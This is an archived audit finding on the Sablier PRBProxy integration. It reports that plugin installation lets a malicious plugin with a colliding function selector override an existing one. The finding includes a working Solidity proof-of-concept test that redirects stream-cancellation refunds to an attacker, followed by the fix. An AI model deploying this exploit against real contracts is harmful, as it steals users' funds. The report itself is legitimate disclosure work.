---
tags:
  - lang/solidity
  - platform/cantina
  - has/poc
  - severity/high
  - sector/lending
  - sector/streaming
  - sector/token
protocol: "[[Sablier]]"
auditors:
  - "[[Zach Obront]]"
report: "https://cdn.cantina.xyz/reports/cantina_sablier_jul2023.pdf"
genome:
  - "[[wrong-condition]]"
  - "[[admin-takeover]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# Plugins can be maliciously overridden by colliding signatures 

- id: 54666
- impact: HIGH
- protocol: [[Sablier]]
- reporter: Zach Obront (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_sablier_jul2023.pdf

## Summary


The bug report discusses a vulnerability in the PRBProxyAnnex.sol file, specifically in the way plugins are saved and installed. It explains that the current method of saving plugins as a mapping can allow for an attacker to override an existing plugin and gain control over the proxy. The report provides a proof of concept using the Sablier integration as an example and recommends a fix to prevent this vulnerability. It also notes that the fix has been applied in the Sablier integration and has been confirmed to solve the issue.

## Details

## Context
- **File**: PRBProxyAnnex.sol#L44-L64
- **Description**: Plugins are saved as a mapping from a 4-byte selector to a given plugin address:

```solidity
mapping(bytes4 method => IPRBProxyPlugin plugin) public plugins;
```

When new plugins are installed, the `methodList()` function is called on the plugin, and then the list of selectors is iterated through to save the plugin address for each selector:

```solidity
function installPlugin(IPRBProxyPlugin plugin) external override {
    // Get the method list to install.
    bytes4[] memory methodList = plugin.methodList();
    // The plugin must have at least one listed method.
    uint256 length = methodList.length;
    if (length == 0) {
        revert PRBProxy_NoPluginMethods(plugin);
    }
    // Enable every method in the list.
    for (uint256 i = 0; i < length;) {
        plugins[methodList[i]] = plugin;
        unchecked {
            i += 1;
        }
    }
    // Log the plugin installation.
    emit InstallPlugin(plugin);
}
```

As a result, an innocent-looking plugin can be crafted to intentionally override an existing plugin. When this happens, it replaces the existing plugin where control flow is sent when the plugin is called.

This is extremely dangerous, as it allows an attacker to skirt around the plugin's protection logic and gain complete control over the proxy mid-execution.

## Proof of Concept
There are many ways this vulnerability could cause harm in various protocols using PRBProxy, but the simplest example can be observed in the Sablier integration.

When a stream is canceled by a receiver, Sablier sends the refund to the sender and then calls `onStreamCanceled()` on the sender contract. The Sablier-defined plugin is utilized to forward these funds to the owner of the proxy.

However, a malicious plugin could be installed with a colliding 4-byte selector that instead sends the funds to an attacker. Even worse, once the attacker gains control flow on behalf of the plugin, they can cancel all other active streams and steal the refundable amounts from all of them, which could be devastating.

Here is a test that can be added to `periphery/test/integration/plugin/on-stream-canceled` that emulates installing an innocent plugin to collect fees from an unrelated protocol, but results in the refund being sent to an attacker when a stream is canceled. The `test_PluginOverride` function emulates the exact behavior of `test_OnStreamCanceled` in your integration tests. However, because the malicious plugin is installed first, the attacker is able to steal the funds.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.19 <0.9.0;
import { LockupLinear } from "@sablier/v2-core/types/DataTypes.sol";
import { ISablierV2Lockup } from "@sablier/v2-core/interfaces/ISablierV2Lockup.sol";
import { ISablierV2ProxyPlugin } from "src/interfaces/ISablierV2ProxyPlugin.sol";
import { IPRBProxyPlugin } from "@prb/proxy/interfaces/IPRBProxyPlugin.sol";
import { Errors } from "src/libraries/Errors.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { Integration_Test } from "../../Integration.t.sol";

interface FeeController {
    function getAsset(uint) external view returns (IERC20);
}

contract InnocentLookingPlugin {
    address constant TREASURY = address(420);
    
    function methodList() external pure returns (bytes4[] memory methods) {
        methods = new bytes4[](1);
        methods[0] = this.onAddictionFeesRefunded.selector; // same as onStreamCanceled
    }
    
    function onAddictionFeesRefunded(uint248 loanId, int168, uint192 feeAmount, int248) public {
        // Get the asset of the loan.
        IERC20 asset = FeeController(msg.sender).getAsset(loanId);
        // Send fees to the treasury.
        asset.transfer({ to: TREASURY, amount: feeAmount });
    }
}

contract PluginOverrideTest is Integration_Test {
    uint256 internal streamId;

    function setUp() public virtual override {
        Integration_Test.setUp();
        installPlugin();
        streamId = createWithRange();
        // Lists the lockupLinear contract in the archive.
        changePrank({ msgSender: users.admin.addr });
        archive.list(address(lockupLinear));
        changePrank({ msgSender: users.alice.addr });
    }

    function test_PluginOverride() external {
        address ATTACKER = address(420);
        // Install an innocent looking plugin, which overrides the onStreamCanceled selector
        IPRBProxyPlugin innocentLookingPlugin = IPRBProxyPlugin(address(new InnocentLookingPlugin()));
        bytes memory data = abi.encodeCall(proxyAnnex.installPlugin, (innocentLookingPlugin));
        proxy.execute(address(proxyAnnex), data);
        // Retrieve the initial asset balances of the proxy owner and the attacker.
        uint256 aliceInitBalance = asset.balanceOf(users.alice.addr);
        uint256 attackerInitBalance = asset.balanceOf(ATTACKER);
        // Simulate the passage of time.
        vm.warp(defaults.CLIFF_TIME());
        // Make the recipient the caller so that Sablier calls the hook implemented by the plugin.
        changePrank({ msgSender: users.recipient.addr });
        // Asset flow: Sablier contract → proxy → ATTACKER!
        // Expect transfers from the Sablier contract to the proxy, and then from the proxy to the ATTACKER!
        expectCallToTransfer({ to: address(proxy), amount: defaults.REFUND_AMOUNT() });
        expectCallToTransfer({ to: ATTACKER, amount: defaults.REFUND_AMOUNT() });
        // Cancel the stream and trigger the plugin.
        lockupLinear.cancel(streamId);
        // Assert that Alice received no funds from the cancellation.
        uint256 aliceFinalBalance = asset.balanceOf(users.alice.addr);
        assertEq(aliceFinalBalance, aliceInitBalance, "balances do not match");
        // Assert that the ATTACKER got the refund amount.
        uint256 attackerFinalBalance = asset.balanceOf(ATTACKER);
        uint256 attackerExpectedBalance = attackerInitBalance + defaults.REFUND_AMOUNT();
        assertEq(attackerExpectedBalance, attackerFinalBalance, "balances do not match");
    }
}
```

## Recommendation
When installing plugins, ensure that the 4-byte selectors do not collide with any existing plugins.

```solidity
function installPlugin(IPRBProxyPlugin plugin) external override {
    // Get the method list to install.
    bytes4[] memory methodList = plugin.methodList();
    // The plugin must have at least one listed method.
    uint256 length = methodList.length;
    if (length == 0) {
        revert PRBProxy_NoPluginMethods(plugin);
    }
    // Enable every method in the list.
    for (uint256 i = 0; i < length;) {
        if (plugins[methodList[i]] != address(0)) revert PRBProxy_SelectorCollision(methodList[i]);
        plugins[methodList[i]] = plugin;
        unchecked {
            i += 1;
        }
    }
    // Log the plugin installation.
    emit InstallPlugin(plugin);
}
```

## Notes
- **Sablier**: Changes applied in PR 121.
- **Cantina**: Confirmed that the current storage layout (pulling methods from storage rather than from `methodList()` call) solves this problem, so this fix is solid.
